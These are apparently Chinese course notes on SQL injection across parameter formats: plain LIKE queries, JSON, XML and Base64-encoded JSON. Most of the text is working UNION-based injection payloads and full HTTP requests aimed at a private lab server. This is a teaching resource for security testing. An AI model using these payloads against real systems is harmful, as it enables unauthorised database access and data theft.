***查不出开报错时改一改注入位置***

## 参数格式

在应用中，存在参数值为数字，字符时，符号的介入，另外搜索功能通配符的再次介入，另外传输数据可由最基本的对应赋值传递改为更加智能的XML或JSON格式传递，部分保证更安全的情况还会采用编码或加密形式传递数据，给于安全测试过程中更大的挑战和难度

### 例子

```
select * from news where id=$id;

select * from news where name='$name';

select * from news where name like '%name%';
```

符号干扰：有无单引号或双引号及通配符等

## XML JSON 编码 混合

### XML

```
<?xml version="1.0" encoding="UTF-8"?>
<news>
	<article>
		<id>1</id>
		<title>xiaodi</title>
		<content>i am xiaodi</content>
		<created_at>2025-03-07</created_at>
	</article>
	<article>
		<id>2</id>
			<title>xiaodisec</title>
			<content>i am xiaodisec</content>
			<created_at>2025-03-06</created_at>
	</article>
</news>
```


### JSON

```
{
	"news:"[
		{
			"id": 1,
			"title": "xiaodi",
			"content": "i am xiaodi",
			"created_at": "2025-03-07"
		},
		{
			"id": 2,
			"title": "xiaodisec",
			"content": "i am xiaodisec",
			"created_at": "2025-03-06"
		}
	]
}
```

### Base64

```
{
	"news": [
		{
			"id": "MQ==",
			"title": "eGlhb2Rp",
			"content": "aSBhbSB4aWFvZGk=",
			"created_at": "MjAyNS0wMy0wNw=="
		},
		{
			"id": "Mg==",
			"title": "eGlhb2Rpc2Vj",
			"content": "aSBhbSB4aWFvZGlzZWM=",
			"created_at": "MjAyNS0wMy0wNg=="
		}
	]
}
```

1、数据传输采用XML或JSON格式传递

2、数据传输采用编码或加密形式传递

3、数据传递采用JSON又采用编码传递

## like注入示例

### 无特殊格式无编码

```
SELECT id, title, created_at FROM news WHERE title LIKE '%1%' OR content LIKE '%1%' ORDER BY created_at DESC
```

注入语句

```
%' order by 3#
%' union select 1,2,3#
%' union select 1,(database()),3#
```

### JSON格式

```
POST /php/json.php HTTP/1.1
Host: 192.168.5.8:9999
Content-Length: 22
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://192.168.5.8:9999
Referer: http://192.168.5.8:9999/php/json.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"id":0,"keyword":"1"}
```

```
{"id":0,"keyword":"1"}
{"id":0,"keyword":"%' order by 3#"}
{"id":0,"keyword":"%' union select 1,2,3#"}
{"id":0,"keyword":"%' union select 1,(database()),3#"}
```

### XML格式

```
POST /php/xml.php HTTP/1.1
Host: 192.168.5.8:9999
Content-Length: 114
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://192.168.5.8:9999
Referer: http://192.168.5.8:9999/php/xml.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive


            <data>
                <id>0</id>
                <keyword>111</keyword>
            </data>
        
```

```
            <data>
                <id>0</id>
                <keyword>%' order by 3#</keyword>
            </data>
			
			<data>
                <id>0</id>
                <keyword>%' union select 1,2,3#</keyword>
            </data>
			
			<data>
                <id>0</id>
                <keyword>%' union select 1,(database()),3#</keyword>
            </data>
```

### JSON+Base64

```
POST /php/jsonbase.php HTTP/1.1
Host: 192.168.5.8:9999
Content-Length: 25
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://192.168.5.8:9999
Referer: http://192.168.5.8:9999/php/jsonbase.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"id":0,"keyword":"MQ=="}
```

```
{"id":0,"keyword":"JScgb3JkZXIgYnkgMyM="}
{"id":0,"keyword":"JScgdW5pb24gc2VsZWN0IDEsMiwzIw=="}
{"id":0,"keyword":"JScgdW5pb24gc2VsZWN0IDEsKGRhdGFiYXNlKCkpLDMj"}
```

## 实例

[https://mp.weixin.qq.com/s/Xf08xaV-YcZsQopE19pPEQ](https://mp.weixin.qq.com/s/Xf08xaV-YcZsQopE19pPEQ)
